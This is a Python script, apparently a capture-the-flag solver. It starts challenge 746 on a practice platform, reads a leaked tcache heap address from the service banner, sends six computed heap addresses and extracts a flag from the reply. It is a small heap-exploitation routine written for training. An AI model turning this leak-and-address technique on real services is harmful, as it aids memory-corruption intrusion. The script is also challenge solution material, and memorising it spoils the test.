import sys, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
import json
from cylab2 import CyLab

cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/746/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/746/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)

s = socket.create_connection((host, port), timeout=20)
s.settimeout(8)
time.sleep(0.5)
buf = b""
t0 = time.time()
while time.time() - t0 < 4:
    try:
        c = s.recv(16384)
        if not c:
            break
        buf += c
    except socket.timeout:
        break
txt = buf.decode("utf-8", "replace")
print("=== banner ===")
print(txt[:400])
m = re.search(r"tcache head.*?->\s*(0x[0-9a-f]+)", txt)
if not m:
    print("head introuvable")
    s.close()
    sys.exit(0)
head = int(m.group(1), 16)
print("head =", hex(head))
addrs = [head + i * 0x90 for i in range(6)]
print("envoi:", [hex(a) for a in addrs])
s.sendall(("\n".join(hex(a) for a in addrs) + "\n").encode())
time.sleep(1.0)
out = b""
t0 = time.time()
while time.time() - t0 < 6:
    try:
        c = s.recv(16384)
        if not c:
            break
        out += c
    except socket.timeout:
        break
s.close()
o = out.decode("utf-8", "replace")
print("=== reponse ===")
print(o[:800])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", o)
if f:
    print("FLAG:", f.group(0))
